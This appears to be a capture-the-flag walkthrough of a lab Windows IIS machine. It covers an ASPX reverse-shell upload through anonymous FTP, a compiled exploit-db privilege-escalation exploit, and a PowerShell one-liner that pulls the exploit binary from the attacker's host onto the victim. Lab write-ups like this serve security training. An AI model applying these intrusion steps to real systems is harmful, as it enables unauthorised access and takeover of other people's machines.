# FOOTHOLD

We can access FTP via anonymous login but there doesn't seem to be anything interesting. However googling about aspnet_client file upload says that scripts can be uploaded in the directory containing aspnet_client directory for validation controls. Also since ASP.NET is enabled we have to upload a .asp/.aspx reverse shell for Windows only.

[aspx reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

Browsing to http://10.10.10.5/reverse.aspx while simultaneously listening via netcat in my terminal gives me a reverse shell.

# PRIVILEGE ESCALATION

So basically , I tried searching for exploits in this list:

[windows privesc](https://www.fuzzysecurity.com/tutorials/16.html)

Searching for the OS build structure shows us an exploitdb script in C language.

[link to script](https://www.exploit-db.com/exploits/40564)

In order to run the file on our windows I made an executable file from the .c file and put it in the same place where we uploaded our reverse shell ( probably should work ).

Here's how to make a windows executable file:

[StackOverFlow link](https://stackoverflow.com/questions/38786014/how-to-compile-executable-for-windows-with-gcc-with-linux-subsystem)

Ugh but it shows up a lot of errors about some undefined reference but googling it tells us we need to add an extra tag (anyone who read the exploit would know about the tag but I didn't read so yea , **TIP OF THE DAY: READ THE EXPLOIT BEFORE EXECUTING**):

```
-lws2_32
```

And this time it compiles without errors.
HOWEVER, it does **NOT** execute. Stubborn Windows throws up some weird error:
```
c:\inetpub\wwwroot>40564.exe
40564.exe
This program cannot be run in DOS mode.
```
Searching for other ways to transfer the file and many frustrated minutes I find out you can transfer files via PowerShell.
Start a python web server in the directory where the file to be transferred is and execute it in the victim windows machine:

```s
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:3000/40564.exe', 'c:\inetpub\wwwroot\40564.exe')"
```
After this i executed the file and ***very fortunately*** finally got root. 
User flag is in c:\Users\babis\Desktop
Root flag is in c:\Users\Administrator\Desktop
